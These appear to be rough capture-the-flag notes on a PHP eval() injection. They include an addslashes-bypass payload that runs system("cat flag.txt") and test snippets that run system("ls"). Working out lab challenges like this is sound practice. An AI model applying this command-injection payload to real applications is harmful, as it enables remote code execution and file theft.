
The php avriable $time is displayed in the view. We see whether we can manipulate the format.  
In TimeController:  
if format is set, the value is passed to the TimeModel without any validation/sanitization. The result of the initialization get assigned to the 'time' variable. The time.getTime() result is then passed to the view to be displayed.

In TimeModel:  
The format string is sanitized by using the addslashes php function. 

%af'%af");system(%af"cat flag.txt%af");%af');#


<?php
// Your code here!
$f='%bf%27';
$format = addslashes($f);
$format = '");\');';
$prediction = "+1 day +2 hour +3 minute + 4 second";
#eval('$time = date("' . $format . '");');
eval('$time = date(""); $time = "ll"; ');
echo isset($time) ? $time : 'Something went terribly wrong';
?>

 

<?php
// Your code here!
$f='%bf%27';
$format = addslashes($f);
$format = '");\');';
$prediction = "+1 day +2 hour +3 minute + 4 second";
#eval('$time = date("' . $format . '");');
eval('$time = date(""); $time = system("ls"); ');
echo isset($time) ? $time : 'Something went terribly wrong';
?>

